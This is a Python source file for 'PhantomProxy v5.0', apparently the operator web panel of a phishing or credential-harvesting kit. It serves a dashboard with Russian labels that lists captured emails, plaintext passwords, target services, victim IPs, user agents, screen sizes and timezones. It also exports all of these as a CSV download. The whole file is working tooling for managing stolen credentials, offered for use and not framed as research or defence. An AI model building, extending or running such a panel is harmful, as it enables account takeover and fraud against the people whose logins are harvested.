#!/usr/bin/env python3
"""
PhantomProxy v5.0 - Web Panel с расширенными функциями
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sqlite3, datetime, os
from urllib.parse import parse_qs

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'phantom.db')

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

class PanelHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.show_dashboard()
        elif self.path.startswith('/sessions'):
            self.show_sessions()
        elif self.path.startswith('/export'):
            self.export_data()
        elif self.path.startswith('/api/stats'):
            self.api_stats()
        else:
            self.send_response(404)
            self.end_headers()
    
    def show_dashboard(self):
        conn = get_db()
        c = conn.cursor()
        
        # Статистика
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service ORDER BY count DESC')
        services = c.fetchall()
        
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC LIMIT 10')
        recent = c.fetchall()
        
        conn.close()
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>PhantomProxy v5.0 Panel</title>
    <meta http-equiv="refresh" content="30">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #eee; }}
        .header {{ background: #16213e; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; }}
        .logo {{ font-size: 24px; font-weight: bold; color: #e94560; }}
        .container {{ padding: 40px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 40px; }}
        .stat-card {{ background: #16213e; padding: 30px; border-radius: 10px; text-align: center; }}
        .stat-value {{ font-size: 48px; font-weight: bold; color: #e94560; }}
        .stat-label {{ color: #aaa; margin-top: 10px; }}
        .section {{ background: #16213e; padding: 30px; border-radius: 10px; margin-bottom: 30px; }}
        .section h2 {{ margin-bottom: 20px; color: #e94560; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ background: #0f3460; color: #fff; }}
        tr:hover {{ background: #0f3460; }}
        .btn {{ background: #e94560; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin: 5px; }}
        .btn:hover {{ background: #ff6b6b; }}
        .service-tag {{ background: #0f3460; padding: 5px 10px; border-radius: 15px; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">🚀 PhantomProxy v5.0</div>
        <div>
            <a href="/" class="btn">Dashboard</a>
            <a href="/sessions" class="btn">Все данные</a>
            <a href="/export" class="btn">Экспорт</a>
        </div>
    </div>
    
    <div class="container">
        <h1 style="margin-bottom: 30px;">Dashboard</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{total}</div>
                <div class="stat-label">Всего сессий</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{today}</div>
                <div class="stat-label">За 24 часа</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{len(services)}</div>
                <div class="stat-label">Сервисов</div>
            </div>
        </div>
        
        <div class="section">
            <h2>📊 По сервисам</h2>
            <table>
                <tr><th>Сервис</th><th>Количество</th></tr>
                {"".join(f"<tr><td><span class='service-tag'>{s[0]}</span></td><td>{s[1]}</td></tr>" for s in services)}
            </table>
        </div>
        
        <div class="section">
            <h2>🕐 Последние сессии</h2>
            <table>
                <tr><th>Email</th><th>Пароль</th><th>Сервис</th><th>IP</th><th>Время</th></tr>
                {"".join(f"<tr><td>{r['email']}</td><td>{r['password']}</td><td><span class='service-tag'>{r['service']}</span></td><td>{r['ip']}</td><td>{r['created_at']}</td></tr>" for r in recent)}
            </table>
        </div>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_sessions(self):
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC')
        rows = c.fetchall()
        conn.close()
        
        html = '''<!DOCTYPE html>
<html>
<head>
    <title>Все сессии - PhantomProxy</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #eee; }
        .header { background: #16213e; padding: 20px 40px; }
        .logo { font-size: 24px; font-weight: bold; color: #e94560; }
        .container { padding: 40px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
        th { background: #0f3460; color: #fff; }
        tr:hover { background: #0f3460; }
        .btn { background: #e94560; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; display: inline-block; margin: 5px; }
        .back { background: #0f3460; }
    </style>
</head>
<body>
    <div class="header"><div class="logo">🚀 PhantomProxy v5.0 - Все сессии</div></div>
    <div class="container">
        <a href="/" class="btn back">← Назад</a>
        <a href="/export" class="btn">Экспорт CSV</a>
        <table>
            <tr><th>ID</th><th>Email</th><th>Password</th><th>Service</th><th>IP</th><th>User Agent</th><th>Created</th></tr>
'''
        for row in rows:
            html += f"<tr><td>{row['id']}</td><td>{row['email']}</td><td>{row['password']}</td><td>{row['service']}</td><td>{row['ip']}</td><td>{row['user_agent'][:50]}...</td><td>{row['created_at']}</td></tr>"
        
        html += '''</table></div></body></html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def export_data(self):
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT * FROM sessions ORDER BY created_at DESC')
        rows = c.fetchall()
        conn.close()
        
        csv = "ID,Email,Password,Service,IP,User Agent,Screen,Timezone,Created\n"
        for row in rows:
            csv += f"{row['id']},{row['email']},{row['password']},{row['service']},{row['ip']},\"{row['user_agent']}\",{row['screen_resolution']},{row['timezone']},{row['created_at']}\n"
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/csv')
        self.send_header('Content-Disposition', 'attachment; filename="phantom_data.csv"')
        self.end_headers()
        self.wfile.write(csv.encode())
    
    def api_stats(self):
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service')
        services = {s[0]: s[1] for s in c.fetchall()}
        conn.close()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'total': total, 'services': services}).encode())
    
    def log_message(self, format, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 3000), PanelHandler)
    print('🎨 Panel запущена на порту 3000')
    print('📊 Dashboard: http://localhost:3000')
    server.serve_forever()
